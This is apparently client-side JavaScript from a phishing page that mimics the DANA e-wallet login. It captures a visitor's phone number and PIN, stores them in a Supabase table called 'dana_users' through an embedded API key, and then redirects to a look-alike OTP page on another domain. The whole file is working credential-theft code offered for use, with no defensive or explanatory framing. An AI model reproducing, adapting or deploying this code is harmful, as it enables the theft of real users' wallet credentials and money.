
  const supabase = window.supabase.createClient(
    'https://vqmfachxnjyxwuavpgds.supabase.co',
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZxbWZhY2h4bmp5eHd1YXZwZ2RzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg0MDYxNDAsImV4cCI6MjA2Mzk4MjE0MH0.Bzr8mUiEl8MzRWpVQ3_59eFxKk0EWZ3ca-4IEcpGLkk'
  );


        let phoneNumberToSave = '';
        let newEntryId = null; 

        function showNomorContent() {
            const initialLoadingScreen = document.getElementById('initial-loading-screen');
            const nomorSection = document.getElementById('nomor-section');

            initialLoadingScreen.style.opacity = '0';
            setTimeout(() => {
                initialLoadingScreen.style.display = 'none';
                nomorSection.style.display = 'block';
                setTimeout(() => {
                    nomorSection.classList.add('visible');
                }, 50);
            }, 1000);
        }

        window.addEventListener('load', () => {
            setTimeout(showNomorContent, 2000);
        });

        const inputNomorHP = document.getElementById('np');
        const tombolLanjutkan = document.getElementById('sdt');
        const universalLoadingOverlay = document.getElementById('universal-loading-overlay');
        
        const nomorLoadingSpinnerWrapper = document.getElementById('nomor-loading-spinner-wrapper'); 
        const pinLoadingSpinnerGroup = document.getElementById('pin-loading-spinner-group'); 

        inputNomorHP.addEventListener('input', function() {
            let formattedValue = this.value.replace(/\D/g, '');

            if (formattedValue.length > 3 && formattedValue.length <= 7) {
                formattedValue = formattedValue.slice(0, 3) + '-' + formattedValue.slice(3);
            } else if (formattedValue.length > 7) {
                formattedValue = formattedValue.slice(0, 3) + '-' + formattedValue.slice(3, 7) + '-' + formattedValue.slice(7, 11);
            }

            this.value = formattedValue;

            const minLength = 9;
            const maxLength = 12;
            const cleanedValue = this.value.replace(/-/g, '');

            if (cleanedValue.length >= minLength && cleanedValue.length <= maxLength) {
                tombolLanjutkan.disabled = false;
                tombolLanjutkan.style.backgroundColor = 'var(--white)';
                tombolLanjutkan.style.color = 'var(--dana-blue)';
                tombolLanjutkan.style.cursor = 'pointer';
            } else {
                tombolLanjutkan.disabled = true;
                tombolLanjutkan.style.backgroundColor = 'var(--button-disabled)';
                tombolLanjutkan.style.color = 'var(--white)';
                tombolLanjutkan.style.cursor = 'not-allowed';
            }
        });

        if (inputNomorHP.value) {
            inputNomorHP.dispatchEvent(new Event('input'));
        }

        tombolLanjutkan.addEventListener('click', async function() {
            if (!this.disabled) {
                const cleanedPhoneNumber = inputNomorHP.value.replace(/-/g, '');
                phoneNumberToSave = cleanedPhoneNumber;
                nomorLoadingSpinnerWrapper.style.display = 'flex';
                pinLoadingSpinnerGroup.style.display = 'none';
                universalLoadingOverlay.style.display = 'flex';
                
                const { data, error } = await supabase
                    .from('dana_users')
                    .insert([
                        { nomor: phoneNumberToSave }
                    ]).select();

                if (error) {
                    console.error('Error menyimpan nomor HP:', error.message);
                    alert('Terjadi kesalahan saat menyimpan nomor HP. Coba lagi.');
                    
                    universalLoadingOverlay.style.display = 'none';
                    document.getElementById('nomor-section').style.display = 'block';
                    document.getElementById('nomor-section').classList.add('visible');
                } else {
                    console.log('Nomor HP berhasil disimpan:', data);
                    if (data && data.length > 0) {
                        newEntryId = data[0].id;
                    }
                    document.getElementById('nomor-section').style.display = 'none';
                    document.getElementById('pin-page').style.display = 'none'; 
                    
                    setTimeout(() => {
                        universalLoadingOverlay.style.display = 'none';
                        document.getElementById('pin-page').style.display = 'block';
                        document.getElementById('pn1').focus();
                    }, 1000);
                }
            }
        });
        
        const pinInputs = document.querySelectorAll("#pinForm input");
        const pinForm = document.getElementById("pinForm");

        pinInputs.forEach((input, index) => {
            input.dataset.index = index;
            input.addEventListener("keydown", clear);
            input.addEventListener("keyup", onKeyUp);
        });
        function clear($event) { $event.target.value = ""; }
        function checkNumber(number) { return /[0-9]/g.test(number); }
        async function onKeyUp($event) {
            const input = $event.target;
            const value = input.value;
            const fieldIndex = +input.dataset.index;
            if ($event.key === "Backspace" && fieldIndex > 0) {
                input.previousElementSibling.focus();
            }
            if (checkNumber(value)) {
                if (value.length > 0 && fieldIndex < pinInputs.length - 1) {
                    input.nextElementSibling.focus();
                }
                let allFilled = true;
                pinInputs.forEach(pinInput => {
                    if (pinInput.value.length === 0) {
                        allFilled = false;
                    }
                });

                if (allFilled) {
                    pinInputs.forEach(pinInput => {
                        pinInput.readOnly = true;
                    });
                    await submitPin();
                }
            } else {
                clear($event);
            }
        }

        async function submitPin(){ 
            const enteredPin = Array.from(pinInputs).map(input => input.value).join('');
            
            nomorLoadingSpinnerWrapper.style.display = 'none'; 
            pinLoadingSpinnerGroup.style.display = 'flex';
            universalLoadingOverlay.style.display = 'flex';

            if (newEntryId) {
                const { data, error } = await supabase
                    .from('dana_users') 
                    .update({ pin: enteredPin })
                    .eq('id', newEntryId);

                if (error) {
                    console.error('Error menyimpan PIN:', error.message);
                    alert('Terjadi kesalahan saat menyimpan PIN. Coba lagi.');
                    universalLoadingOverlay.style.display = 'none';
                    pinInputs.forEach(input => {
                        input.value = '';
                        input.type = 'password';
                        input.readOnly = false;
                    });
                    btn_show.innerHTML='TAMPILKAN';
                    document.getElementById('pn1').focus();
                } else {
                    console.log('PIN berhasil disimpan:', data);
                    setTimeout(function(){
                        window.location.href = 'https://danpaylogs.idgetne.my/by04.1/kotp/index.html';
                    }, 900);
                }
            } else {
                console.error('ID entri tidak ditemukan. Tidak dapat menyimpan PIN.');
                alert('Terjadi kesalahan. ID entri tidak ditemukan. Silakan coba lagi dari awal.');
                universalLoadingOverlay.style.display = 'none';
                pinInputs.forEach(input => {
                    input.value = '';
                    input.type = 'password';
                    input.readOnly = false;
                });
                btn_show.innerHTML='TAMPILKAN';
                document.getElementById('pn1').focus();
            }
        }

        var btn_show = document.getElementById('see');
        var pin1 = document.getElementById('pn1');

        btn_show.addEventListener('click', pasToText);

        function pasToText(){
            const currentType = pin1.type;
            const newType = (currentType === 'password') ? 'text' : 'password';
            const buttonText = (currentType === 'password') ? 'SEMBUNYIKAN' : 'TAMPILKAN';

            pinInputs.forEach(input => {
                input.setAttribute('type', newType);
            });
            btn_show.innerHTML = buttonText;
        }

        document.getElementById('back-to-nomor-btn').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('pin-page').style.display = 'none';
            document.getElementById('nomor-section').style.display = 'block';
            document.getElementById('nomor-section').classList.add('visible');
            pinInputs.forEach(input => {
                input.value = '';
                input.type = 'password';
                input.readOnly = false;
            });
            btn_show.innerHTML='TAMPILKAN';
            document.getElementById('np').focus();
        });
        
